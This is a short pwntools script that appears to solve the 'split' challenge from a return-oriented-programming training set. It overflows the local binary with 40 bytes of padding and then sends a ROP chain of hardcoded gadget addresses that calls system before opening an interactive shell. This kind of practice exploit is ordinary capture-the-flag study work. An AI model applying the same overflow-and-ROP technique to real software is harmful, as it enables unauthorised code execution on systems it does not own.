from pwn import *

challenge = process("./split")

for i in range(0, 4):
	print(challenge.readline())

challenge.sendline("A"*40+"\xc3\x07\x40"+"\x00"*5+"\x60\x10\x60"+"\x00"*5+"\x4b\x07\x40"+"\x00"*5)


challenge.interactive()

#for i in range(0,6):
#	print(challenge.readline())
